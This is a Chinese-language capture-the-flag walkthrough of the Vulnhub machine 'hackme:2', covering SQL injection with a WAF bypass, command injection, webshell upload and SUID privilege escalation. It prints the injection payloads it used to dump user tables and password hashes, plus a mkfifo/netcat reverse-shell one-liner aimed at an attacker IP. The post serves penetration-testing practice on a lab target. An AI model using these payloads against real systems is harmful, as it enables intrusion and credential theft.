> 原文链接: https://www.anquanke.com//post/id/227330 


# hackme：2 靶机攻略


                                阅读量   
                                **122746**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t013c48ea25872f01b1.png)](https://p5.ssl.qhimg.com/t013c48ea25872f01b1.png)



## 0x01 背景：

hackme:2是vulnhub上的一个medium难度的CTF靶机，难度适中、内容丰富，贴近实战。而且没有太多的脑洞，适合安全工作者们用来练习渗透测试，然而唯一的缺憾是目前没有公开的攻略，因此把个人的通关过程记录于此，作为攻略分享给大家！



## 0x02 技术关键词：

`SQL注入、WAF Bypass、模糊测试、文件上传、suid提权`



## 0x03 靶机发现与端口扫描

做vulnhub上的靶机的第一步，所有的靶机都是一样的套路，不在这里多费笔墨。

[![](https://p5.ssl.qhimg.com/t018b18becf20e217ad.png)](https://p5.ssl.qhimg.com/t018b18becf20e217ad.png)

[![](https://p0.ssl.qhimg.com/t0122ee7116c8895706.png)](https://p0.ssl.qhimg.com/t0122ee7116c8895706.png)



## 0x04 SQL注入与WAF Bypass

打开位于80端口的Web页面，注册一个测试账号wangtua/wangtua，就可以登录系统了，可以发现是一个书店系统。

[![](https://p4.ssl.qhimg.com/t012802b1c4f7c4f8c0.png)](https://p4.ssl.qhimg.com/t012802b1c4f7c4f8c0.png)

进入系统之后发现有一个搜索框，SQL注入的套路很明显了。要做SQL注入、第一步就是猜测SQL语句的格式和注入点。

### <a class="reference-link" name="1%E3%80%81%E6%8E%A2%E6%B5%8BSQL%E6%A0%BC%E5%BC%8F%EF%BC%8CWAF%E8%A7%84%E5%88%99"></a>1、探测SQL格式，WAF规则

本搜索框的功能是检索数据库中的书名、当搜索框为空的时候，可以返回所有的内容，

[![](https://p1.ssl.qhimg.com/t014128e3e2852aa799.png)](https://p1.ssl.qhimg.com/t014128e3e2852aa799.png)

当搜索框中只包含书名的前一部分的时候，也可以返回对应的内容：

[![](https://p4.ssl.qhimg.com/t01323ca751312a1b94.png)](https://p4.ssl.qhimg.com/t01323ca751312a1b94.png)

因此我们猜测SQL语句格式为(%代表通配符，可以匹配零个或者多个任意字符)：<br>`$sql = "SELECT * FROM BOOKS WHERE book_name LIKE '".$input."%';"`<br>
基于此，我们构造如下payload：`Linux%' and '123' like '1`

[![](https://p5.ssl.qhimg.com/t01d3890668d922d39e.png)](https://p5.ssl.qhimg.com/t01d3890668d922d39e.png)

使用另一个payload：`Linux%' and '23' like '1`<br>
发现无法返回结果

[![](https://p2.ssl.qhimg.com/t01e7094981f82985b2.png)](https://p2.ssl.qhimg.com/t01e7094981f82985b2.png)

可以验证我们的想法。<br>
然而我们使用数据库函数的时候却出现了问题：<br>
Payload:`Linux%'/**/and database() like/**/'`<br>**没有返回内容**,而当我们使用注释符来代替空格的时候，则**可以执行成功**。

[![](https://p1.ssl.qhimg.com/t011578d6c1594888dd.png)](https://p1.ssl.qhimg.com/t011578d6c1594888dd.png)

### <a class="reference-link" name="2%E3%80%81%E6%9E%84%E9%80%A0Payload"></a>2、构造Payload

通过构造联合查询，一步一步获取出数据库名，表名，列名和字段<br>`Linux%'/**/union/**/select/**/database/**/(),'2','3`

[![](https://p2.ssl.qhimg.com/t01d25c79b3ce172b43.png)](https://p2.ssl.qhimg.com/t01d25c79b3ce172b43.png)

`Linux%'/**/union/**/select/**/group_concat(table_name),"2","3"/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'webapp`

[![](https://p4.ssl.qhimg.com/t01f67cc8c1dcfbecbd.png)](https://p4.ssl.qhimg.com/t01f67cc8c1dcfbecbd.png)

`Linux%'/**/union/**/select/**/group_concat(column_name),"2","3"/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'users'and/**/table_schema/**/like'webapp`

[![](https://p1.ssl.qhimg.com/t01e9f5c9e889645006.png)](https://p1.ssl.qhimg.com/t01e9f5c9e889645006.png)

`Linux%'/**/union/**/select/**/group_concat(user),'2',group_concat(pasword)/**/from/**/users/**/where/**/'1'/**/like/**/'`

[![](https://p2.ssl.qhimg.com/t013e6d0531359652c2.png)](https://p2.ssl.qhimg.com/t013e6d0531359652c2.png)

到此为止我们发现了一个superadmin的账号，将md5值在线解码之后发现是Uncrackable



## 0x05 模糊测试与命令执行

进入超级管理员账号之后，我们发现了一个可以进行文件上传的点,

[![](https://p2.ssl.qhimg.com/t01aa18243223775d7a.png)](https://p2.ssl.qhimg.com/t01aa18243223775d7a.png)

上传cat.jpg之后，页面上回显了上传路径。<br>
然而我们却无法直接访问任何文件。<br>
接下来我们注意到下面两个输入框，可以将处理结果回显到页面上，这里我除了想到XSS之外。还想到了测试命令注入或者模板注入。可以发现在Last Name输入框里输入`7*7`，可以返回`49`<br>
我们可以使用BurpSuite专业版的Intruder模块来进行模糊测试。

[![](https://p0.ssl.qhimg.com/t0147a88da17864766c.png)](https://p0.ssl.qhimg.com/t0147a88da17864766c.png)

Payload选择模糊测试-完整，

[![](https://p0.ssl.qhimg.com/t0130feaa3a796c4261.png)](https://p0.ssl.qhimg.com/t0130feaa3a796c4261.png)

点击开始攻击。<br>
攻击完成之后可以发现 ``id` ` 这个payload有命令执行的回显。

[![](https://p0.ssl.qhimg.com/t018a035c130735b7eb.png)](https://p0.ssl.qhimg.com/t018a035c130735b7eb.png)

我们换其他命令来执行，例如pwd,ls都可以正确执行而cat命令无法执行，猜测其过滤了空格，我们使用`cat&lt;welcomeadmin.php`这个payload来绕过过滤。<br>
可以看到在返回包里泄露的welcomeadmin.php的完整源代码，包括文件上传的绝对路径。

[![](https://p5.ssl.qhimg.com/t011a53fa9e663ee271.png)](https://p5.ssl.qhimg.com/t011a53fa9e663ee271.png)

以及命令执行的成因：

[![](https://p2.ssl.qhimg.com/t01dbe80cdd4332bb10.png)](https://p2.ssl.qhimg.com/t01dbe80cdd4332bb10.png)

使用哥斯拉生成木马并上传，发现php后缀被过滤，换成php3等也不行。

[![](https://p1.ssl.qhimg.com/t01760ce9246d07092e.png)](https://p1.ssl.qhimg.com/t01760ce9246d07092e.png)

[![](https://p1.ssl.qhimg.com/t013c54a30f439a0b1e.png)](https://p1.ssl.qhimg.com/t013c54a30f439a0b1e.png)

后缀改成png之后才上传成功，然而无法正常解析成PHP文件。

[![](https://p1.ssl.qhimg.com/t01e4d11495ebc0e0d9.png)](https://p1.ssl.qhimg.com/t01e4d11495ebc0e0d9.png)

这里考虑使用刚才的命令执行漏洞，将文件名改成god.php

[![](https://p4.ssl.qhimg.com/t01bcea70c5703af50f.png)](https://p4.ssl.qhimg.com/t01bcea70c5703af50f.png)

使用哥斯拉进行连接，发现连接成功

[![](https://p0.ssl.qhimg.com/t018a7d16925256e9dd.png)](https://p0.ssl.qhimg.com/t018a7d16925256e9dd.png)



## 0x06 后渗透与提权

为了可以有更好的交互环境，我们用kali自带的weevely生成木马并连接，完成连接之后使用nc反弹shell：<br>
由于靶机的nc版本特殊，无法使用nc -e选项，因此这里使用了如下的payload<br>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.48.129 2333 &gt;/tmp/f`<br>
(来自参考资料2)

[![](https://p1.ssl.qhimg.com/t01525cd9639a374c44.png)](https://p1.ssl.qhimg.com/t01525cd9639a374c44.png)

使用pyhton伪终端命令,可以在伪终端执行sudo等命令

[![](https://p4.ssl.qhimg.com/t0150df668cd2328bf7.png)](https://p4.ssl.qhimg.com/t0150df668cd2328bf7.png)

使用命令`find / -perm -u=s -type f 2&gt;/dev/null`来发现设置了suid位的应用程序（参考资料1）<br>
关于suid提权的原理，可以参考P师傅的博客(参考资料3)。

发现home目录下有一个可疑的文件，执行一下之后发现顺利get root权限。

[![](https://p5.ssl.qhimg.com/t01885ba4289694db50.png)](https://p5.ssl.qhimg.com/t01885ba4289694db50.png)

[![](https://p1.ssl.qhimg.com/t012624487f7e25288f.png)](https://p1.ssl.qhimg.com/t012624487f7e25288f.png)



## 0x07 总结与复盘：

这台靶机感觉制作的比较用心，SQL注入和文件上传等部分都比较贴近实战，唯一美中不足的是提权部分有些太过简单。目前本人正在备考OSCP，在vulnhub和HTB上做了不少靶机，打算最近把vulnhub上后渗透的套路总结一下，再发一篇文章，希望大家支持一下。



## 0x08 参考资料：

1） [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)<br>
2） [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)<br>
3） [https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html](https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html)
